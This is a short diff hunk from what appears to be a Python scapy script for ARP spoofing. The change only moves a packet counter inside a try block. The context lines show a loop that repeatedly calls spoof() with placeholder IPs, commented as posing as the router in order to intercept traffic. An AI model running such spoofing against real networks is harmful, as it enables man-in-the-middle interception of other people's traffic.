@@ -17,9 +17,9 @@ def spoof(target_ip, spoof_ip):
     scapy.send(packet, verbose = False)
 
 
-sent_packets_count = 0
 
 try:
+    sent_packets_count = 0
     while True:
         spoof("xx.xx.xx.xx", "xx.xx.xx.xx") #spoofs IP to pose as the router
         spoof("xx.xx.xx.xx", "xx.xx.xx.xx")
